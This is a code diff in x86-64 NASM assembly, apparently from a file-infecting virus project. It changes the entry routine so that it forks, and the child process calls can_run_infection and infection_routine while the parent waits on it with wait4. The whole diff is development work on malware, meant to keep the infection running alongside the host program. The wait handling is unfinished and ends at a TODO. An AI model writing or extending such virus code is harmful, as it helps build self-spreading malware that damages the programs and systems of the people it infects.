@@ -23,6 +23,7 @@ begin:
 	%assign %$localsize 0
 
 	%local compressed_data_size:qword					; long compressed_data_size;
+	%local child_pid:qword							; long child_pid;
 	%xdefine compressed_data rbp - %$localsize - COMPRESSION_BUF_SIZE	; uint8_t compressed_data[COMPRESSION_BUF_SIZE]
 	%assign %$localsize %$localsize + COMPRESSION_BUF_SIZE			; ...
 
@@ -31,6 +32,15 @@ begin:
 	mov rbp, rsp
 	sub rsp, %$localsize
 
+	mov rax, SYS_FORK				; _pid = fork();
+	syscall						; ...
+	cmp rax, 0					; if (_pid < 0)
+	jl .skipped					; 	goto .skipped;
+	je .child					; else if (_pid == 0) goto .child;
+	mov [child_pid], rax				; _child_pid = _pid;
+	jmp .parent					; else goto .parent;
+
+.child:
 	call can_run_infection				; if (can_run_infection() == 0)
 	cmp rax, 0					; 	goto .skipped;
 	je .skipped					; ...
@@ -56,6 +66,20 @@ begin:
 	add rsi, COMPRESSION_BUF_SIZE			; /* Ugly thing because of arbitraty COMPRESSION_BUF_SIZE
 	sub rsi, rdi					; ... */
 	call infection_routine				; ...
+	jmp .skipped
+
+.parent:
+	sub rsp, 8
+	mov rax, SYS_WAIT4				; _ret = wait4(
+	mov rdi, [child_pid]				; child_pid,
+	mov rsi, rsp					; 
+	mov rdx, WEXITED				; WEXITED
+	xor r10, r10					; 0
+	syscall						; );
+	cmp rax, -1					; if (_ret = -1)
+	; TODO CHECK FOR ERROR, MAYBE LOOP BECAUSE OF E_INTR?
+	
+	
 
 .skipped:
 	add rsp, %$localsize
